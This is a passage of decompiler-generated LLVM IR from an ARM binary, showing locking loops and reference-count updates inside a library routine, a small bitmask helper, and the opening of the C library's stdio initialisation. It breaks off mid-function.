dec_label_pc_17d74:                               ; preds = %dec_label_pc_17d80.dec_label_pc_17d74_crit_edge, %dec_label_pc_17d6c
  %v0_17d74 = phi i32 [ %v0_17d74.pre, %dec_label_pc_17d80.dec_label_pc_17d74_crit_edge ], [ %v4_17d54, %dec_label_pc_17d6c ]
  %v1_17d74 = inttoptr i32 %v0_17d74 to i32*
  %v2_17d74 = load i32, i32* %v1_17d74, align 4
  store i32 %v2_17d74, i32* %r3.global-to-local, align 4
  %v1_17d78 = load i32, i32* %r4.global-to-local, align 4
  %v3_17d78 = icmp uge i32 %v2_17d74, %v1_17d78
  store i1 %v3_17d78, i1* %cpsr_c.global-to-local, align 1
  %v9_17d78 = icmp eq i32 %v2_17d74, %v1_17d78
  br i1 %v9_17d78, label %dec_label_pc_17d80, label %dec_label_pc_17d98

dec_label_pc_17d80:                               ; preds = %dec_label_pc_17d74
  store i32 %v2_17d74, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17d90 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17d90, label %dec_label_pc_17d94, label %dec_label_pc_17d80.dec_label_pc_17d74_crit_edge

dec_label_pc_17d80.dec_label_pc_17d74_crit_edge:  ; preds = %dec_label_pc_17d80
  %v0_17d74.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d74

dec_label_pc_17d94:                               ; preds = %dec_label_pc_17d80
  %v0_17d94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17d94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17d98

dec_label_pc_17d98:                               ; preds = %dec_label_pc_17d74, %dec_label_pc_17d94
  %v0_17d98 = phi i32 [ %v0_17d94, %dec_label_pc_17d94 ], [ %v2_17d74, %dec_label_pc_17d74 ]
  %v1_17d98 = phi i32 [ %v0_17d94, %dec_label_pc_17d94 ], [ %v1_17d78, %dec_label_pc_17d74 ]
  %v3_17d98 = icmp uge i32 %v0_17d98, %v1_17d98
  store i1 %v3_17d98, i1* %cpsr_c.global-to-local, align 1
  %v9_17d98 = icmp eq i32 %v0_17d98, %v1_17d98
  br i1 %v9_17d98, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_17d98
  %v1_17d9c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17d9c, i32* %r0.global-to-local, align 4
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_17d98, %bb59
  %v1_17da0 = xor i1 %v9_17d98, true
  call void @__pseudo_cond_branch(i1 %v1_17da0, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_17da4 = load i32, i32* %r6.global-to-local, align 4
  %v1_17da4 = load i32, i32* %r7.global-to-local, align 4
  %v2_17da4 = add i32 %v1_17da4, 8
  %v3_17da4 = inttoptr i32 %v2_17da4 to i32*
  store i32 %v0_17da4, i32* %v3_17da4, align 4
  %v1_17dc4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17da8

dec_label_pc_17da8:                               ; preds = %dec_label_pc_17d50, %bb60
  %v1_17dc4 = phi i32 [ %v3_17d5c, %dec_label_pc_17d50 ], [ %v1_17dc4.pre, %bb60 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17dac = load i32, i32* @r8, align 4
  %v2_17dac = add i32 %v0_17dac, 160
  %v3_17dac = inttoptr i32 %v2_17dac to i32*
  %v4_17dac = load i32, i32* %v3_17dac, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17db4 = add i32 %v0_17dac, 152
  %v3_17db4 = inttoptr i32 %v2_17db4 to i32*
  %v4_17db4 = load i32, i32* %v3_17db4, align 4
  store i32 %v4_17db4, i32* %r7.global-to-local, align 4
  %v1_17db8 = add i32 %v4_17dac, 4
  %v2_17db8 = inttoptr i32 %v1_17db8 to i32*
  %v3_17db8 = load i32, i32* %v2_17db8, align 4
  store i32 %v3_17db8, i32* %r3.global-to-local, align 4
  %v1_17dbc = add i32 %v4_17db4, 8
  %v2_17dbc = inttoptr i32 %v1_17dbc to i32*
  %v3_17dbc = load i32, i32* %v2_17dbc, align 4
  store i32 %v3_17dbc, i32* %r2.global-to-local, align 4
  %v1_17dc0 = add i32 %v3_17db8, 1
  store i32 %v1_17dc0, i32* %r3.global-to-local, align 4
  %v3_17dc4 = icmp uge i32 %v3_17dbc, %v1_17dc4
  store i1 %v3_17dc4, i1* %cpsr_c.global-to-local, align 1
  %v9_17dc4 = icmp eq i32 %v3_17dbc, %v1_17dc4
  store i32 %v1_17dc0, i32* %v2_17db8, align 4
  br i1 %v9_17dc4, label %dec_label_pc_17e10, label %dec_label_pc_17dd0

dec_label_pc_17dd0:                               ; preds = %dec_label_pc_17da8
  %v0_17dd4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17dd4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_17ddc96 = inttoptr i32 %v0_17dd4 to i32*
  %v2_17ddc97 = load i32, i32* %v1_17ddc96, align 4
  store i32 %v2_17ddc97, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17de099 = icmp eq i32 %v2_17ddc97, 0
  br i1 %v9_17de099, label %dec_label_pc_17de8, label %dec_label_pc_17e00

dec_label_pc_17de8:                               ; preds = %dec_label_pc_17dd0, %dec_label_pc_17de8.dec_label_pc_17ddc_crit_edge
  %v0_17de8100 = phi i32 [ %v1_17de0.pre, %dec_label_pc_17de8.dec_label_pc_17ddc_crit_edge ], [ 0, %dec_label_pc_17dd0 ]
  store i32 %v0_17de8100, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17df8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17df8, label %dec_label_pc_17dfc, label %dec_label_pc_17de8.dec_label_pc_17ddc_crit_edge

dec_label_pc_17de8.dec_label_pc_17ddc_crit_edge:  ; preds = %dec_label_pc_17de8
  %v0_17ddc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17de0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17ddc = inttoptr i32 %v0_17ddc.pre to i32*
  %v2_17ddc = load i32, i32* %v1_17ddc, align 4
  store i32 %v2_17ddc, i32* %r3.global-to-local, align 4
  %v3_17de0 = icmp uge i32 %v2_17ddc, %v1_17de0.pre
  store i1 %v3_17de0, i1* %cpsr_c.global-to-local, align 1
  %v9_17de0 = icmp eq i32 %v2_17ddc, %v1_17de0.pre
  br i1 %v9_17de0, label %dec_label_pc_17de8, label %dec_label_pc_17e00

dec_label_pc_17dfc:                               ; preds = %dec_label_pc_17de8
  %v0_17dfc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17dfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17e00

dec_label_pc_17e00:                               ; preds = %dec_label_pc_17dd0, %dec_label_pc_17de8.dec_label_pc_17ddc_crit_edge, %dec_label_pc_17dfc
  %v0_17e00 = phi i32 [ %v0_17dfc, %dec_label_pc_17dfc ], [ %v2_17ddc97, %dec_label_pc_17dd0 ], [ %v2_17ddc, %dec_label_pc_17de8.dec_label_pc_17ddc_crit_edge ]
  %v1_17e00 = phi i32 [ %v0_17dfc, %dec_label_pc_17dfc ], [ 0, %dec_label_pc_17dd0 ], [ %v1_17de0.pre, %dec_label_pc_17de8.dec_label_pc_17ddc_crit_edge ]
  %v3_17e00 = icmp uge i32 %v0_17e00, %v1_17e00
  store i1 %v3_17e00, i1* %cpsr_c.global-to-local, align 1
  %v9_17e00 = icmp eq i32 %v0_17e00, %v1_17e00
  br i1 %v9_17e00, label %bb62, label %bb61

bb61:                                             ; preds = %dec_label_pc_17e00
  %v1_17e04 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_17e04, i32* %r0.global-to-local, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_17e00, %bb61
  %v1_17e08 = xor i1 %v9_17e00, true
  call void @__pseudo_cond_branch(i1 %v1_17e08, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_17e0c = load i32, i32* %r6.global-to-local, align 4
  %v1_17e0c = load i32, i32* %r7.global-to-local, align 4
  %v2_17e0c = add i32 %v1_17e0c, 8
  %v3_17e0c = inttoptr i32 %v2_17e0c to i32*
  store i32 %v0_17e0c, i32* %v3_17e0c, align 4
  br label %dec_label_pc_17e10

dec_label_pc_17e10:                               ; preds = %dec_label_pc_17da8, %bb62
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_17e14 = load i32, i32* @r8, align 4
  %v2_17e14 = add i32 %v0_17e14, 152
  %v3_17e14 = inttoptr i32 %v2_17e14 to i32*
  %v4_17e14 = load i32, i32* %v3_17e14, align 4
  store i32 %v4_17e14, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_17e1c = add i32 %v0_17e14, 76
  %v3_17e1c = inttoptr i32 %v2_17e1c to i32*
  %v4_17e1c = load i32, i32* %v3_17e1c, align 4
  store i32 %v4_17e1c, i32* @r1, align 4
  %v1_17e20 = add i32 %v4_17e14, 4
  %v2_17e20 = inttoptr i32 %v1_17e20 to i32*
  %v3_17e20 = load i32, i32* %v2_17e20, align 4
  store i32 %v3_17e20, i32* %r3.global-to-local, align 4
  %v1_17e24 = inttoptr i32 %v4_17e1c to i32*
  %v2_17e24 = load i32, i32* %v1_17e24, align 4
  store i32 %v2_17e24, i32* %r2.global-to-local, align 4
  %v1_17e28 = add i32 %v3_17e20, 1
  store i32 %v1_17e28, i32* %r3.global-to-local, align 4
  store i32 %v1_17e28, i32* %v2_17e20, align 4
  %v0_17e30 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e30 = load i32, i32* @r5, align 4
  %v2_17e30 = add i32 %v1_17e30, 32
  %v3_17e30 = inttoptr i32 %v2_17e30 to i32*
  store i32 %v0_17e30, i32* %v3_17e30, align 4
  %v0_17e34 = load i32, i32* %r0.global-to-local, align 4
  %v1_17e34 = add i32 %v0_17e34, 4
  %v2_17e34 = inttoptr i32 %v1_17e34 to i32*
  %v3_17e34 = load i32, i32* %v2_17e34, align 4
  %v1_17e38 = add i32 %v3_17e34, -1
  store i32 %v1_17e38, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e3c = icmp eq i32 %v1_17e38, 0
  %v0_17e40 = load i32, i32* @r5, align 4
  %v1_17e40 = load i32, i32* @r1, align 4
  %v2_17e40 = inttoptr i32 %v1_17e40 to i32*
  store i32 %v0_17e40, i32* %v2_17e40, align 4
  %v0_17e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e44 = load i32, i32* %r0.global-to-local, align 4
  %v2_17e44 = add i32 %v1_17e44, 4
  %v3_17e44 = inttoptr i32 %v2_17e44 to i32*
  store i32 %v0_17e44, i32* %v3_17e44, align 4
  br i1 %v2_17e3c, label %dec_label_pc_17e4c, label %dec_label_pc_17eac

dec_label_pc_17e4c:                               ; preds = %dec_label_pc_17e10
  %v0_17e4c = load i32, i32* %r3.global-to-local, align 4
  %v1_17e4c = load i32, i32* %r0.global-to-local, align 4
  %v2_17e4c = add i32 %v1_17e4c, 8
  %v3_17e4c = inttoptr i32 %v2_17e4c to i32*
  store i32 %v0_17e4c, i32* %v3_17e4c, align 4
  %v0_17e50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17e50, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17e54

dec_label_pc_17e54:                               ; preds = %dec_label_pc_17e84.dec_label_pc_17e54_crit_edge, %dec_label_pc_17e4c
  %v0_17e54 = phi i32 [ %v0_17e54.pre, %dec_label_pc_17e84.dec_label_pc_17e54_crit_edge ], [ %v0_17e50, %dec_label_pc_17e4c ]
  %v1_17e54 = inttoptr i32 %v0_17e54 to i32*
  %v2_17e54 = load i32, i32* %v1_17e54, align 4
  store i32 %v2_17e54, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_17e54, i32* %r2.global-to-local, align 4
  %v2_17e6084 = load i32, i32* %v1_17e54, align 4
  store i32 %v2_17e6084, i32* %r3.global-to-local, align 4
  %v3_17e6486 = icmp uge i32 %v2_17e6084, %v2_17e54
  store i1 %v3_17e6486, i1* %cpsr_c.global-to-local, align 1
  %v9_17e6492 = icmp eq i32 %v2_17e6084, %v2_17e54
  br i1 %v9_17e6492, label %dec_label_pc_17e6c, label %dec_label_pc_17e84

dec_label_pc_17e6c:                               ; preds = %dec_label_pc_17e54, %dec_label_pc_17e6c.dec_label_pc_17e60_crit_edge
  %v0_17e6c93 = phi i32 [ %v1_17e64.pre, %dec_label_pc_17e6c.dec_label_pc_17e60_crit_edge ], [ %v2_17e54, %dec_label_pc_17e54 ]
  store i32 %v0_17e6c93, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17e7c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17e7c, label %dec_label_pc_17e80, label %dec_label_pc_17e6c.dec_label_pc_17e60_crit_edge

dec_label_pc_17e6c.dec_label_pc_17e60_crit_edge:  ; preds = %dec_label_pc_17e6c
  %v0_17e60.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17e64.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17e60 = inttoptr i32 %v0_17e60.pre to i32*
  %v2_17e60 = load i32, i32* %v1_17e60, align 4
  store i32 %v2_17e60, i32* %r3.global-to-local, align 4
  %v3_17e64 = icmp uge i32 %v2_17e60, %v1_17e64.pre
  store i1 %v3_17e64, i1* %cpsr_c.global-to-local, align 1
  %v9_17e64 = icmp eq i32 %v2_17e60, %v1_17e64.pre
  br i1 %v9_17e64, label %dec_label_pc_17e6c, label %dec_label_pc_17e84

dec_label_pc_17e80:                               ; preds = %dec_label_pc_17e6c
  %v0_17e80 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17e80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17e84

dec_label_pc_17e84:                               ; preds = %dec_label_pc_17e54, %dec_label_pc_17e6c.dec_label_pc_17e60_crit_edge, %dec_label_pc_17e80
  %v0_17e8c = phi i32 [ %v0_17e80, %dec_label_pc_17e80 ], [ %v2_17e6084, %dec_label_pc_17e54 ], [ %v2_17e60, %dec_label_pc_17e6c.dec_label_pc_17e60_crit_edge ]
  %v1_17e84 = phi i32 [ %v0_17e80, %dec_label_pc_17e80 ], [ %v2_17e54, %dec_label_pc_17e54 ], [ %v1_17e64.pre, %dec_label_pc_17e6c.dec_label_pc_17e60_crit_edge ]
  %v3_17e84 = icmp uge i32 %v0_17e8c, %v1_17e84
  store i1 %v3_17e84, i1* %cpsr_c.global-to-local, align 1
  %v9_17e84 = icmp eq i32 %v0_17e8c, %v1_17e84
  br i1 %v9_17e84, label %dec_label_pc_17e8c, label %dec_label_pc_17e84.dec_label_pc_17e54_crit_edge

dec_label_pc_17e84.dec_label_pc_17e54_crit_edge:  ; preds = %dec_label_pc_17e84
  %v0_17e54.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17e54

dec_label_pc_17e8c:                               ; preds = %dec_label_pc_17e84
  %v2_17e8c = icmp ne i32 %v1_17e84, 0
  store i1 %v2_17e8c, i1* %cpsr_c.global-to-local, align 1
  %v7_17e90 = icmp slt i32 %v1_17e84, 2
  br i1 %v7_17e90, label %dec_label_pc_17eac, label %dec_label_pc_17e94

dec_label_pc_17e94:                               ; preds = %dec_label_pc_17e8c
  %v0_17e94 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17e94, i32* %r0.global-to-local, align 4
  %v0_17e98 = load i32, i32* @r1, align 4
  %v1_17e98 = add i32 %v0_17e98, 129
  store i32 %v1_17e98, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17eac

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17e10, %dec_label_pc_17e94, %dec_label_pc_17e8c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17eb0 = load i32, i32* @r8, align 4
  %v2_17eb0 = add i32 %v0_17eb0, 160
  %v3_17eb0 = inttoptr i32 %v2_17eb0 to i32*
  %v4_17eb0 = load i32, i32* %v3_17eb0, align 4
  store i32 %v4_17eb0, i32* %r0.global-to-local, align 4
  %v1_17eb4 = add i32 %v4_17eb0, 4
  %v2_17eb4 = inttoptr i32 %v1_17eb4 to i32*
  %v3_17eb4 = load i32, i32* %v2_17eb4, align 4
  %v1_17eb8 = add i32 %v3_17eb4, -1
  store i32 %v1_17eb8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ebc = icmp eq i32 %v1_17eb8, 0
  store i32 %v1_17eb8, i32* %v2_17eb4, align 4
  br i1 %v2_17ebc, label %dec_label_pc_17ec8, label %dec_label_pc_17f30

dec_label_pc_17ec8:                               ; preds = %dec_label_pc_17eac
  %v0_17ec8 = load i32, i32* %r3.global-to-local, align 4
  %v1_17ec8 = load i32, i32* %r0.global-to-local, align 4
  %v2_17ec8 = add i32 %v1_17ec8, 8
  %v3_17ec8 = inttoptr i32 %v2_17ec8 to i32*
  store i32 %v0_17ec8, i32* %v3_17ec8, align 4
  %v0_17ecc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17ecc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ed0

dec_label_pc_17ed0:                               ; preds = %dec_label_pc_17f00.dec_label_pc_17ed0_crit_edge, %dec_label_pc_17ec8
  %v0_17ed0 = phi i32 [ %v0_17ed0.pre, %dec_label_pc_17f00.dec_label_pc_17ed0_crit_edge ], [ %v0_17ecc, %dec_label_pc_17ec8 ]
  %v1_17ed0 = inttoptr i32 %v0_17ed0 to i32*
  %v2_17ed0 = load i32, i32* %v1_17ed0, align 4
  store i32 %v2_17ed0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_17ed0, i32* %r2.global-to-local, align 4
  %v2_17edc72 = load i32, i32* %v1_17ed0, align 4
  store i32 %v2_17edc72, i32* %r3.global-to-local, align 4
  %v3_17ee074 = icmp uge i32 %v2_17edc72, %v2_17ed0
  store i1 %v3_17ee074, i1* %cpsr_c.global-to-local, align 1
  %v9_17ee080 = icmp eq i32 %v2_17edc72, %v2_17ed0
  br i1 %v9_17ee080, label %dec_label_pc_17ee8, label %dec_label_pc_17f00

dec_label_pc_17ee8:                               ; preds = %dec_label_pc_17ed0, %dec_label_pc_17ee8.dec_label_pc_17edc_crit_edge
  %v0_17ee881 = phi i32 [ %v1_17ee0.pre, %dec_label_pc_17ee8.dec_label_pc_17edc_crit_edge ], [ %v2_17ed0, %dec_label_pc_17ed0 ]
  store i32 %v0_17ee881, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17ef8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17ef8, label %dec_label_pc_17efc, label %dec_label_pc_17ee8.dec_label_pc_17edc_crit_edge

dec_label_pc_17ee8.dec_label_pc_17edc_crit_edge:  ; preds = %dec_label_pc_17ee8
  %v0_17edc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17ee0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17edc = inttoptr i32 %v0_17edc.pre to i32*
  %v2_17edc = load i32, i32* %v1_17edc, align 4
  store i32 %v2_17edc, i32* %r3.global-to-local, align 4
  %v3_17ee0 = icmp uge i32 %v2_17edc, %v1_17ee0.pre
  store i1 %v3_17ee0, i1* %cpsr_c.global-to-local, align 1
  %v9_17ee0 = icmp eq i32 %v2_17edc, %v1_17ee0.pre
  br i1 %v9_17ee0, label %dec_label_pc_17ee8, label %dec_label_pc_17f00

dec_label_pc_17efc:                               ; preds = %dec_label_pc_17ee8
  %v0_17efc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17efc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17f00

dec_label_pc_17f00:                               ; preds = %dec_label_pc_17ed0, %dec_label_pc_17ee8.dec_label_pc_17edc_crit_edge, %dec_label_pc_17efc
  %v0_17f08 = phi i32 [ %v0_17efc, %dec_label_pc_17efc ], [ %v2_17edc72, %dec_label_pc_17ed0 ], [ %v2_17edc, %dec_label_pc_17ee8.dec_label_pc_17edc_crit_edge ]
  %v1_17f00 = phi i32 [ %v0_17efc, %dec_label_pc_17efc ], [ %v2_17ed0, %dec_label_pc_17ed0 ], [ %v1_17ee0.pre, %dec_label_pc_17ee8.dec_label_pc_17edc_crit_edge ]
  %v3_17f00 = icmp uge i32 %v0_17f08, %v1_17f00
  store i1 %v3_17f00, i1* %cpsr_c.global-to-local, align 1
  %v9_17f00 = icmp eq i32 %v0_17f08, %v1_17f00
  br i1 %v9_17f00, label %dec_label_pc_17f08, label %dec_label_pc_17f00.dec_label_pc_17ed0_crit_edge

dec_label_pc_17f00.dec_label_pc_17ed0_crit_edge:  ; preds = %dec_label_pc_17f00
  %v0_17ed0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17ed0

dec_label_pc_17f08:                               ; preds = %dec_label_pc_17f00
  %v2_17f08 = icmp ne i32 %v1_17f00, 0
  store i1 %v2_17f08, i1* %cpsr_c.global-to-local, align 1
  %v7_17f0c = icmp slt i32 %v1_17f00, 2
  br i1 %v7_17f0c, label %dec_label_pc_17f30, label %dec_label_pc_17f10

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17f08
  %v0_17f10 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17f10, i32* %r0.global-to-local, align 4
  %v0_17f14 = load i32, i32* @r1, align 4
  %v1_17f14 = add i32 %v0_17f14, 129
  store i32 %v1_17f14, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17f30

dec_label_pc_17f2c:                               ; preds = %dec_label_pc_17b70, %dec_label_pc_17b54, %dec_label_pc_17b7c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17f30

dec_label_pc_17f30:                               ; preds = %dec_label_pc_17eac, %bb58, %dec_label_pc_17bb4, %dec_label_pc_17f08, %dec_label_pc_17f10, %dec_label_pc_17f2c
  %v0_17f30 = load i32, i32* @r5, align 4
  store i32 %v0_17f30, i32* %r0.global-to-local, align 4
  %v2_17f38 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17f38, i32* %r4.global-to-local, align 4
  store i32 %v6_17b14, i32* @r5, align 4
  store i32 %v9_17b14, i32* @r6, align 4
  store i32 %v12_17b14, i32* @r7, align 4
  store i32 %v15_17b14, i32* @r8, align 4
  ret i32 %v0_17f30

; uselistorder directives
  uselistorder i32 %v0_17efc, { 1, 0, 2 }
  uselistorder i32 %v1_17ee0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17ed0, { 1, 0 }
  uselistorder i32 %v0_17e80, { 1, 0, 2 }
  uselistorder i32 %v1_17e64.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17e54, { 1, 0 }
  uselistorder i32 %v0_17dfc, { 1, 0, 2 }
  uselistorder i32 %v1_17de0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17d94, { 1, 0, 2 }
  uselistorder i32 %v1_17d78, { 0, 2, 1 }
  uselistorder i32 %v4_17d54, { 2, 1, 0, 3 }
  uselistorder i32 %v1_17d04.pre, { 2, 1, 0 }
  uselistorder i32 %v0_17c88, { 1, 2, 0 }
  uselistorder i32 %v1_17c18, { 1, 0 }
  uselistorder i32 %v0_17c18, { 1, 0 }
  uselistorder i32 %v1_17c00, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17ba4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 7, 9, 8, 10, 11, 13, 12, 14, 1, 0, 2, 3, 5, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 8, 9, 10, 11, 13, 12, 14, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 36, 37, 39, 38, 33, 40, 41, 42, 43, 44, 46, 45, 34, 48, 47, 49, 50, 51, 52, 53, 1, 3, 2, 35, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32 }
  uselistorder i32* %r2.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r0.global-to-local, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 27, 25, 26, 28, 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11, 13, 14, 15 }
  uselistorder i1* %cpsr_c.global-to-local, { 28, 29, 31, 30, 24, 32, 33, 34, 36, 35, 25, 37, 0, 1, 26, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 16384, { 68, 69, 0, 70, 31, 61, 32, 62, 33, 63, 34, 64, 35, 65, 36, 66, 14, 67, 1, 45, 27, 49, 28, 50, 26, 46, 29, 47, 30, 48, 2, 51, 3, 52, 4, 53, 5, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 11, 60, 37, 71, 12, 72, 13, 73, 16, 74, 39, 75, 40, 76, 41, 77, 15, 78, 38, 79, 80, 17, 81, 18, 82, 19, 83, 42, 84, 20, 85, 21, 86, 23, 87, 22, 88, 24, 89, 25, 90, 44, 91, 92, 93, 43, 94 }
  uselistorder i32 (i32, i16*)* @__libc_open, { 0, 6, 4, 5, 1, 2, 3 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 14, 0, 13, 10, 9, 12, 11, 8, 5, 4, 3, 7, 6, 2, 1 }
  uselistorder i32 1024, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 ()* @malloc, { 70, 69, 68, 4, 3, 2, 0, 1, 6, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_17f30, { 5, 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17f2c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17f00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ee8, { 1, 0 }
  uselistorder label %dec_label_pc_17eac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17e84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17e6c, { 1, 0 }
  uselistorder label %dec_label_pc_17e10, { 1, 0 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_17e00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17de8, { 1, 0 }
  uselistorder label %dec_label_pc_17da8, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_17d98, { 1, 0 }
  uselistorder label %bb58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17ce0, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_17c48._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17bf0, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_17b8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17b54, { 1, 2, 0 }
}

define i32 @function_17f44(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17f44:
  %v0_17f44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17f44, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17f44
  %v5_17f44 = sdiv i32 %arg2, 16
  %v6_17f44 = and i32 %v5_17f44, %arg1
  %v5_17f48 = sdiv i32 %arg2, 256
  %v6_17f48 = and i32 %v6_17f44, %v5_17f48
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17f44, %bb
  %v10_17f4c = phi i32 [ %arg1, %dec_label_pc_17f44 ], [ %v6_17f48, %bb ]
  ret i32 %v10_17f4c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_17f7c = call i32 @__aeabi_read_tp()
  %v3_17f80 = load i16, i16* @global_var_2447c.761, align 2
  %v4_17f80 = sext i16 %v3_17f80 to i32
  store i32 %v4_17f80, i32* @r3, align 4
  store i32 %v0_17f7c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_17f8c = add i32 %v4_17f80, %v0_17f7c
  %v3_17f8c = inttoptr i32 %v2_17f8c to i32*
  %v4_17f8c = load i32, i32* %v3_17f8c, align 4
